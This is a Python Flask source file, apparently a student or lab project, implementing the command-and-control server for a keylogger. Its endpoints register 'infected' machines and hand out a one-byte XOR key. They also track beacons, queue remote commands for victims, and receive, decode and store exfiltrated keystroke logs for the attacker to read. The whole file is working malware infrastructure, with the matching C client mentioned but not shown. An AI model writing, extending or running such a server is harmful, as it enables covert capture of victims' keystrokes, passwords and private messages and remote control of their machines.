
from flask import Flask, request, Response
import time
import os


app = Flask(__name__)

PLAIN_TEXT =   {'Content-Type': 'text/plain'}
BYTES_FORMAT = {'Content-Type': 'application/octet-stream'}
MAX_ACTIVE_TIME_BETWEEN_BEACON = 45


class Cli():
    def __init__(self, id: str, os: str, arch: str, time_s: str, enc_key: bytes):
        self.id = id       # client id    
        self.os_ = os      # os version
        self.arch = arch   # client architecture
        self.enc_key = enc_key   # randomly generated encoding key
        self.commands, self.logs = [], []
        self.last_beacon = float(time_s)  # stores last beacon time
        self.beacon_diff = self.get_time_since_beacon()
        self.is_active = True
    
    def get_time_since_beacon(self):
        ' return the difference in seconds since last beacon'
        return time.time() - self.last_beacon

    def update_status(self):
        ' simply update the time since last beacon, if > 60 seconds set client as inactive '
        self.beacon_diff = self.get_time_since_beacon()
        self.is_active = self.beacon_diff <= MAX_ACTIVE_TIME_BETWEEN_BEACON
    
    def add_command(self, cmd):
        self.commands.append(cmd)

    def add_log(self, log):
        self.logs.append(log)
    
    def __str__(self):
        str_ =  f'{self.id}\n'
        str_ += f'  - Last Beacon: {time.ctime(self.last_beacon)}, {int(self.beacon_diff)}s ago.\n'
        str_ += f'  - Status: {"ACTIVE" if self.is_active else "NOT ACTIVE"}\n'
        return str_


# dictionary of client_id->client_object
clients: dict[str, Cli] = {}



@app.route('/register', methods=['GET'])
def register():
    ''' TARGETED BY: client
    Function to register an infected machine 
    '''
    id = request.args.get('id')
    os_ = request.args.get('os')
    arch = request.args.get('arch')
    time_s = request.args.get('time')
    enc_key = os.urandom(1)  # random single byte key

    clients[id] = Cli(id, os_, arch, time_s, enc_key)
    return Response(enc_key, status=200, content_type=BYTES_FORMAT)


@app.route('/logs/<cid>', methods=['POST'])
def exfiltrate(cid):
    ''' TARGETED BY: client
    If the client is registered then recieve their keylog buffer,
    decode the contents and add them to the clients logs 
    '''
    if cid not in clients.keys():
        return '', 400

    log = request.get_data(as_text=False) # we want bytes not text!
    log = decode(log, clients[cid].enc_key)  # decode the encoded logs

    clients[cid].add_log(log)
    return '', 200


@app.route('/commands', methods=['GET'])
def get_commands():
    ''' TARGETED BY: client
    Endpoint serves as both command retrieval and beaconing. 
    Requests come in the form /commands?cid=<cid>&time=<timstamp>
    Server responds with the encoded commands to perform
    '''
    cid = request.args.get('cid')
    if cid not in clients.keys():
        return '', 400

    client = clients[cid]   # retieve client and update beacon information
    client.last_beacon = float(request.args.get('time'))
    client.update_status()

    if len(client.commands) == 0:  # if there are no queued commands
        return '', 200
    
    encoded_commands = encode_commands(client)
    client.commands = []  # clear command log
    
    return Response(encoded_commands, status=200, content_type=BYTES_FORMAT)


@app.route('/commands/<cid>', methods=['POST'])
def add_command(cid):
    ''' TARGETED BY: attacker 
    Post a new command to the clients command queue
    '''
    if cid not in clients.keys():
        return f'BAD REQ: <{cid}> is not registered.', 400, PLAIN_TEXT
    
    cmd = request.get_data(as_text=True)
    clients[cid].add_command(cmd)
    return f'Successfully sent \'{cmd}\' to <{cid}>', 200, PLAIN_TEXT

@app.route('/clients', methods=['GET'])
def get_clients():
    ''' TARGETED BY: attacker 
    Update all the client information to make sure it is 
    up to date. Then return each of their information
    '''
    for client in clients.values():
        client.update_status()

    clis_as_strs = [str(c) for c in clients.values()]
    return '\n'.join(clis_as_strs), 200, PLAIN_TEXT


@app.route('/logs/<cid>', methods=['GET'])
def get_log(cid):
    ''' TARGETED BY: attacker 
    Retrieve the logs for a registered client
    '''
    if cid not in clients.keys():
        return f'BAD REQ: <{cid}> is not registered.', 400, PLAIN_TEXT

    logs_str = '\n'.join(
        f'{i+1}: {log}' for i, log in
        enumerate(clients[cid].logs)
    )
    
    return logs_str, 200, PLAIN_TEXT



# -------------------------
# Encoding helper functions
# -------------------------

def encode_commands(client: Cli) -> bytes:
    ''' Given a client, encode all of their queued commands,
    each being seperated by a newline character
    '''
    cmds_bytes = bytearray()
    num_cmds = len(client.commands)
    for i, cmd in enumerate(client.commands):
        encoded_cmd = encode(cmd, client.enc_key)
        cmds_bytes.extend(encoded_cmd)
        if i < num_cmds - 1:
            cmds_bytes.append(0x0A) # \n
    return bytes(cmds_bytes)

def rotate_right(ch):
    ''' This performs the same operation as in my c code 
    but applies an 8-bit mask of 0xFF. This knowledge was
    sourced from chatgpt.com (OpenAI, 2025) 
    '''
    return ((ch >> 1) | (ch << (8 - 1))) & 0xFF

def encode(msg: str, key: bytes) -> bytes:
    ' Encode the message '
    return asym_xor(msg.encode('utf-8'), key)

def decode(msg: bytes, key: bytes) -> str:
    ' Decodes and encoded message '
    return asym_xor(msg, key).decode('utf-8')

def asym_xor(s: bytes, key: bytes) -> bytes:
    ''' symetric encoding function, iterate each element
    in a byte array and perform the null-preserving xor 
    using the circular right shift key
    '''
    key = key[0]
    result = bytearray()

    for byte in s:
        if byte != key and key != 0x00:
            byte ^= key   # perform xor
        result.append(byte)
        key = rotate_right(key)

    return bytes(result)


if __name__ == '__main__':
    app.run(host='127.0.0.1', port=5000)

